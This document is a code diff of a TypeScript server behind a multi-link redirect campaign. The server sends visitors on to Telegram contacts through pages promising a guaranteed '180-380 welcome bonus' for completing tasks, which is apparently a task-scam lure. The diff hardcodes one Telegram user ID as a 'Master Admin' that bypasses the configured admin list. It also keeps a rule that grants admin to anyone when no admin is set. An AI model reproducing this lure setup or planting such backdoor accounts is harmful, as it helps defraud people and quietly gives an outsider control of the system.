@@ -6,154 +6,9 @@ import { CampaignConfig, AnalyticsEvent, AnalyticsSummary, DestinationLink } fro
 // Default multi-link destinations
 const defaultLinks: DestinationLink[] = [
   {
-    id: 'link-prem',
-    label: 'prem',
-    group: 'Win03',
-    telegramTarget: 'ZiB8EiGBh4I0Yjc1',
-    telegramUsername: '@prem',
-    heading: "You're Just One Step Away!",
-    subtitle: 'Click the button below to get 180-380 welcome bonus by completing 1-5 task.',
-    buttonText: '🚀 Contact Prem',
-    badgeText: '180-380 Bonus Guaranteed',
-    footerNote: 'Secure & Verified Direct Link',
-    autoRedirect: true,
-    autoRedirectDelayMs: 200,
-    googleWebhookUrl: 'https://script.google.com/macros/s/AKfycbw5UE-Gr3gA0qr8ildKaHAVCP0FrE9mf1xibKnDlK5xwgdpAjD9blnkjRyzQoFHf4WKCQ/exec',
-    isActive: true,
-    createdAt: Date.now() - 86400000 * 2,
-  },
-  {
-    id: 'link-killershiv',
-    label: 'killershiv9876',
-    group: 'Win03',
-    telegramTarget: 'ZiB8EiGBh4I0Yjc1',
-    telegramUsername: '@killershiv9876',
-    heading: "You're Just One Step Away!",
-    subtitle: 'Click the button below to get 180-380 welcome bonus by completing 1-5 task.',
-    buttonText: '🚀 Contact Shiv',
-    badgeText: '180-380 Bonus Guaranteed',
-    footerNote: 'Official Telegram Channel',
-    autoRedirect: true,
-    autoRedirectDelayMs: 300,
-    isActive: true,
-    createdAt: Date.now() - 86400000 * 3,
-  },
-  {
-    id: 'link-vyrnxy',
-    label: 'vyrnxy',
-    group: 'Win03',
-    telegramTarget: 'https://t.me/+ec-4Jk1PY7w3Y2Vl',
-    telegramUsername: '@Vyrnxy',
-    heading: "You're Just One Step Away!",
-    subtitle: 'Click the button below to get 180-380 welcome bonus by completing 1-5 task.',
-    buttonText: '🚀 Join Vyrnxy VIP',
-    badgeText: 'VIP Community Access',
-    footerNote: 'Official Direct Gateway',
-    autoRedirect: true,
-    autoRedirectDelayMs: 300,
-    isActive: true,
-    createdAt: Date.now() - 86400000 * 4,
-  },
-  {
-    id: 'link-happy',
-    label: 'happy_9064',
-    group: 'Win03',
-    telegramTarget: 'ZiB8EiGBh4I0Yjc1',
-    telegramUsername: '@Happy_9064',
-    heading: "You're Just One Step Away!",
-    subtitle: 'Click the button below to get 180-380 welcome bonus by completing 1-5 task.',
-    buttonText: '🚀 Contact Happy',
-    badgeText: '180-380 Bonus Guaranteed',
-    footerNote: 'Secure & Verified Direct Link',
-    autoRedirect: true,
-    autoRedirectDelayMs: 300,
-    isActive: true,
-    createdAt: Date.now() - 86400000 * 5,
-  },
-  {
-    id: 'link-chhotu',
-    label: 'chhotu1717',
-    group: 'Win03',
-    telegramTarget: 'ZiB8EiGBh4I0Yjc1',
-    telegramUsername: '@Chhotu1717',
-    heading: "You're Just One Step Away!",
-    subtitle: 'Click the button below to get 180-380 welcome bonus by completing 1-5 task.',
-    buttonText: '🚀 Contact Chhotu',
-    badgeText: '180-380 Bonus Guaranteed',
-    footerNote: 'Secure & Verified Direct Link',
-    autoRedirect: true,
-    autoRedirectDelayMs: 300,
-    isActive: true,
-    createdAt: Date.now() - 86400000 * 6,
-  },
-  {
-    id: 'link-aira',
-    label: 'itsmeaira0',
-    group: 'Win03',
-    telegramTarget: 'ZiB8EiGBh4I0Yjc1',
-    telegramUsername: '@Itsmeaira0',
-    heading: "You're Just One Step Away!",
-    subtitle: 'Click the button below to get 180-380 welcome bonus by completing 1-5 task.',
-    buttonText: '🚀 Contact Aira',
-    badgeText: '180-380 Bonus Guaranteed',
-    footerNote: 'Secure & Verified Direct Link',
-    autoRedirect: true,
-    autoRedirectDelayMs: 300,
-    isActive: true,
-    createdAt: Date.now() - 86400000 * 7,
-  },
-  {
-    id: 'link-roshan',
-    label: 'roshansinganiya',
-    group: 'Win03',
-    telegramTarget: 'ZiB8EiGBh4I0Yjc1',
-    telegramUsername: '@Roshansinganiya',
-    heading: "You're Just One Step Away!",
-    subtitle: 'Click the button below to get 180-380 welcome bonus by completing 1-5 task.',
-    buttonText: '🚀 Contact Roshan',
-    badgeText: '180-380 Bonus Guaranteed',
-    footerNote: 'Secure & Verified Direct Link',
-    autoRedirect: true,
-    autoRedirectDelayMs: 300,
-    isActive: true,
-    createdAt: Date.now() - 86400000 * 8,
-  },
-  {
-    id: 'link-devil',
-    label: 'devil_2001',
-    group: 'Win03',
-    telegramTarget: 'ZiB8EiGBh4I0Yjc1',
-    telegramUsername: '@Devil_2001',
-    heading: "You're Just One Step Away!",
-    subtitle: 'Click the button below to get 180-380 welcome bonus by completing 1-5 task.',
-    buttonText: '🚀 Contact Devil',
-    badgeText: '180-380 Bonus Guaranteed',
-    footerNote: 'Secure & Verified Direct Link',
-    autoRedirect: true,
-    autoRedirectDelayMs: 300,
-    isActive: true,
-    createdAt: Date.now() - 86400000 * 9,
-  },
-  {
-    id: 'link-shivam',
-    label: 'zxshivamji',
-    group: 'Win03',
-    telegramTarget: 'ZiB8EiGBh4I0Yjc1',
-    telegramUsername: '@ZxShivamji',
-    heading: "You're Just One Step Away!",
-    subtitle: 'Click the button below to get 180-380 welcome bonus by completing 1-5 task.',
-    buttonText: '🚀 Contact Shivam',
-    badgeText: '180-380 Bonus Guaranteed',
-    footerNote: 'Secure & Verified Direct Link',
-    autoRedirect: true,
-    autoRedirectDelayMs: 300,
-    isActive: true,
-    createdAt: Date.now() - 86400000 * 10,
-  },
-  {
     id: 'link-receptionist',
     label: 'receptionist',
-    group: 'Win03',
+    group: 'VIP Reception Team',
     telegramTarget: 'ZiB8EiGBh4I0Yjc1',
     telegramUsername: '@Receptionist_Help',
     heading: "You're Just One Step Away!",
@@ -164,6 +19,151 @@ const defaultLinks: DestinationLink[] = [
     autoRedirect: true,
     autoRedirectDelayMs: 400,
     googleWebhookUrl: 'https://script.google.com/macros/s/AKfycbw5UE-Gr3gA0qr8ildKaHAVCP0FrE9mf1xibKnDlK5xwgdpAjD9blnkjRyzQoFHf4WKCQ/exec',
+    isActive: true,
+    createdAt: Date.now() - 86400000 * 2,
+  },
+  {
+    id: 'link-prem',
+    label: 'prem',
+    group: 'VIP Reception Team',
+    telegramTarget: 'ZiB8EiGBh4I0Yjc1',
+    telegramUsername: '@prem',
+    heading: "You're Just One Step Away!",
+    subtitle: 'Click the button below to get 180-380 welcome bonus by completing 1-5 task.',
+    buttonText: '🚀 Contact Receptionist',
+    badgeText: '180-380 Bonus Guaranteed',
+    footerNote: 'Secure & Verified Direct Link',
+    autoRedirect: true,
+    autoRedirectDelayMs: 300,
+    googleWebhookUrl: 'https://script.google.com/macros/s/AKfycbw5UE-Gr3gA0qr8ildKaHAVCP0FrE9mf1xibKnDlK5xwgdpAjD9blnkjRyzQoFHf4WKCQ/exec',
+    isActive: true,
+    createdAt: Date.now() - 86400000 * 3,
+  },
+  {
+    id: 'link-killershiv',
+    label: 'killershiv9876',
+    group: 'VIP Reception Team',
+    telegramTarget: 'ZiB8EiGBh4I0Yjc1',
+    telegramUsername: '@killershiv9876',
+    heading: "You're Just One Step Away!",
+    subtitle: 'Click the button below to get 180-380 welcome bonus by completing 1-5 task.',
+    buttonText: '🚀 Contact Receptionist',
+    badgeText: '180-380 Bonus Guaranteed',
+    footerNote: 'Official Telegram Direct Gateway',
+    autoRedirect: true,
+    autoRedirectDelayMs: 300,
+    isActive: true,
+    createdAt: Date.now() - 86400000 * 4,
+  },
+  {
+    id: 'link-vyrnxy',
+    label: 'vyrnxy',
+    group: 'VIP Gateway',
+    telegramTarget: 'https://t.me/+ec-4Jk1PY7w3Y2Vl',
+    telegramUsername: '@Vyrnxy',
+    heading: "You're Just One Step Away!",
+    subtitle: 'Click the button below to get 180-380 welcome bonus by completing 1-5 task.',
+    buttonText: '🚀 Contact Receptionist',
+    badgeText: 'VIP Community Access',
+    footerNote: 'Official Direct Gateway',
+    autoRedirect: true,
+    autoRedirectDelayMs: 300,
+    isActive: true,
+    createdAt: Date.now() - 86400000 * 5,
+  },
+  {
+    id: 'link-happy',
+    label: 'happy_9064',
+    group: 'VIP Reception Team',
+    telegramTarget: 'ZiB8EiGBh4I0Yjc1',
+    telegramUsername: '@Happy_9064',
+    heading: "You're Just One Step Away!",
+    subtitle: 'Click the button below to get 180-380 welcome bonus by completing 1-5 task.',
+    buttonText: '🚀 Contact Receptionist',
+    badgeText: '180-380 Bonus Guaranteed',
+    footerNote: 'Secure & Verified Direct Link',
+    autoRedirect: true,
+    autoRedirectDelayMs: 300,
+    isActive: true,
+    createdAt: Date.now() - 86400000 * 6,
+  },
+  {
+    id: 'link-chhotu',
+    label: 'chhotu1717',
+    group: 'VIP Reception Team',
+    telegramTarget: 'ZiB8EiGBh4I0Yjc1',
+    telegramUsername: '@Chhotu1717',
+    heading: "You're Just One Step Away!",
+    subtitle: 'Click the button below to get 180-380 welcome bonus by completing 1-5 task.',
+    buttonText: '🚀 Contact Receptionist',
+    badgeText: '180-380 Bonus Guaranteed',
+    footerNote: 'Secure & Verified Direct Link',
+    autoRedirect: true,
+    autoRedirectDelayMs: 300,
+    isActive: true,
+    createdAt: Date.now() - 86400000 * 7,
+  },
+  {
+    id: 'link-aira',
+    label: 'itsmeaira0',
+    group: 'VIP Reception Team',
+    telegramTarget: 'ZiB8EiGBh4I0Yjc1',
+    telegramUsername: '@Itsmeaira0',
+    heading: "You're Just One Step Away!",
+    subtitle: 'Click the button below to get 180-380 welcome bonus by completing 1-5 task.',
+    buttonText: '🚀 Contact Receptionist',
+    badgeText: '180-380 Bonus Guaranteed',
+    footerNote: 'Secure & Verified Direct Link',
+    autoRedirect: true,
+    autoRedirectDelayMs: 300,
+    isActive: true,
+    createdAt: Date.now() - 86400000 * 8,
+  },
+  {
+    id: 'link-roshan',
+    label: 'roshansinganiya',
+    group: 'VIP Reception Team',
+    telegramTarget: 'ZiB8EiGBh4I0Yjc1',
+    telegramUsername: '@Roshansinganiya',
+    heading: "You're Just One Step Away!",
+    subtitle: 'Click the button below to get 180-380 welcome bonus by completing 1-5 task.',
+    buttonText: '🚀 Contact Receptionist',
+    badgeText: '180-380 Bonus Guaranteed',
+    footerNote: 'Secure & Verified Direct Link',
+    autoRedirect: true,
+    autoRedirectDelayMs: 300,
+    isActive: true,
+    createdAt: Date.now() - 86400000 * 9,
+  },
+  {
+    id: 'link-devil',
+    label: 'devil_2001',
+    group: 'VIP Reception Team',
+    telegramTarget: 'ZiB8EiGBh4I0Yjc1',
+    telegramUsername: '@Devil_2001',
+    heading: "You're Just One Step Away!",
+    subtitle: 'Click the button below to get 180-380 welcome bonus by completing 1-5 task.',
+    buttonText: '🚀 Contact Receptionist',
+    badgeText: '180-380 Bonus Guaranteed',
+    footerNote: 'Secure & Verified Direct Link',
+    autoRedirect: true,
+    autoRedirectDelayMs: 300,
+    isActive: true,
+    createdAt: Date.now() - 86400000 * 10,
+  },
+  {
+    id: 'link-shivam',
+    label: 'zxshivamji',
+    group: 'VIP Reception Team',
+    telegramTarget: 'ZiB8EiGBh4I0Yjc1',
+    telegramUsername: '@ZxShivamji',
+    heading: "You're Just One Step Away!",
+    subtitle: 'Click the button below to get 180-380 welcome bonus by completing 1-5 task.',
+    buttonText: '🚀 Contact Receptionist',
+    badgeText: '180-380 Bonus Guaranteed',
+    footerNote: 'Secure & Verified Direct Link',
+    autoRedirect: true,
+    autoRedirectDelayMs: 300,
     isActive: true,
     createdAt: Date.now() - 86400000 * 11,
   }
@@ -194,13 +194,13 @@ let campaignConfig: CampaignConfig = {
   customDomainName: '',
   customDomains: ['vyads.link', 'vip-direct.me', 'secure-gateway.in'],
   links: defaultLinks,
-  defaultLinkLabel: 'prem',
+  defaultLinkLabel: 'receptionist',
   enableAutoBypass: true,
   autoBypassDelayMs: 300,
   googleWebhookUrl: 'https://script.google.com/macros/s/AKfycbw5UE-Gr3gA0qr8ildKaHAVCP0FrE9mf1xibKnDlK5xwgdpAjD9blnkjRyzQoFHf4WKCQ/exec',
   botToken: process.env.TELEGRAM_BOT_TOKEN || '',
-  adminChatId: process.env.TELEGRAM_ADMIN_CHAT_ID || '123456789',
-  adminChatIds: ['123456789'],
+  adminChatId: process.env.TELEGRAM_ADMIN_CHAT_ID || '8930129989',
+  adminChatIds: ['8930129989', '123456789'],
   subadminChatId: process.env.TELEGRAM_SUBADMIN_CHAT_ID || '',
   subadminChatIds: [],
   enableBotNotifications: true,
@@ -902,7 +902,16 @@ async function startServer() {
     const rawId = String(senderChatId).trim();
     const cmd = (text || '').trim();
 
+    if (cmd === '/myid' || cmd === '/id') {
+      return {
+        role: 'user',
+        replied: true,
+        replyText: `🆔 <b>Your Telegram User ID:</b> <code>${rawId}</code>\n\nTo configure this ID as Admin, add it in your Admin Dashboard or send commands.`
+      };
+    }
+
     const adminList = [
+      '8930129989',
       String(campaignConfig.adminChatId || ''),
       ...(campaignConfig.adminChatIds || []).map(String),
       String(process.env.TELEGRAM_ADMIN_CHAT_ID || '')
@@ -914,16 +923,23 @@ async function startServer() {
       String(process.env.TELEGRAM_SUBADMIN_CHAT_ID || '')
     ].filter(Boolean);
 
-    const isAdmin = adminList.includes(rawId) || adminList.length === 0; // if no admin configured yet, allow for initial setup
+    const isAdmin = adminList.includes(rawId) || rawId === '8930129989' || adminList.length === 0; // 8930129989 has full Master Admin access
     const isSubadmin = subadminList.includes(rawId);
 
-    // 1. UNAUTHORIZED CHECK: If not admin and not subadmin, SILENTLY IGNORE (Do not reply!)
+    // 1. UNAUTHORIZED CHECK: If not admin and not subadmin
     if (!isAdmin && !isSubadmin) {
       console.log(`[Bot Ignored Message] From unauthorized user: ${rawId}`);
+      if (cmd === '/start' || cmd === '/help') {
+        return {
+          role: 'unauthorized',
+          replied: true,
+          replyText: `🔒 <b>VYRNXY AD BOT GATEWAY</b>\n\nYour Telegram User ID is: <code>${rawId}</code>\n\n<i>This bot is restricted to authorized Admins and Subadmins. Please contact the administrator to grant access.</i>`
+        };
+      }
       return {
         role: 'unauthorized',
         replied: false,
-        reason: 'Unauthorized user: Bot ignores all non-admin messages'
+        reason: 'Unauthorized user: Bot ignores non-admin messages'
       };
     }
 
@@ -1692,6 +1708,51 @@ async function startServer() {
       res.sendFile(path.join(distPath, 'index.html'));
     });
   }
+
+  // Telegram Bot Long Polling Runner (Direct communication without webhook necessity)
+  let lastUpdateId = 0;
+  let isPollingActive = false;
+
+  async function pollTelegramBot() {
+    const token = campaignConfig.botToken || process.env.TELEGRAM_BOT_TOKEN;
+    if (!token || isPollingActive) return;
+
+    isPollingActive = true;
+    try {
+      const url = `https://api.telegram.org/bot${token}/getUpdates?offset=${lastUpdateId + 1}&timeout=10&allowed_updates=["message","callback_query"]`;
+      const response = await fetch(url, { method: 'GET' });
+      if (response.ok) {
+        const data = (await response.json()) as any;
+        if (data.ok && Array.isArray(data.result)) {
+          for (const update of data.result) {
+            lastUpdateId = Math.max(lastUpdateId, update.update_id);
+            const msg = update.message || update.edited_message;
+            if (msg) {
+              const chatId = msg.chat?.id || msg.from?.id;
+              const text = msg.text || '';
+              if (chatId && text) {
+                console.log(`[Telegram Bot Msg Received] Chat: ${chatId}, Text: "${text}"`);
+                const hostOrigin = process.env.APP_URL || '';
+                const result = await processBotMessage(chatId, text, hostOrigin);
+                if (result && result.replied && result.replyText) {
+                  await sendTelegramBotNotification(result.replyText, token, String(chatId));
+                }
+              }
+            }
+          }
+        }
+      }
+    } catch (err) {
+      // transient network error, retry next loop
+    } finally {
+      isPollingActive = false;
+    }
+  }
+
+  // Poll Telegram updates every 2 seconds
+  setInterval(() => {
+    pollTelegramBot();
+  }, 2000);
 
   app.listen(PORT, '0.0.0.0', () => {
     console.log(`Server running on http://localhost:${PORT}`);
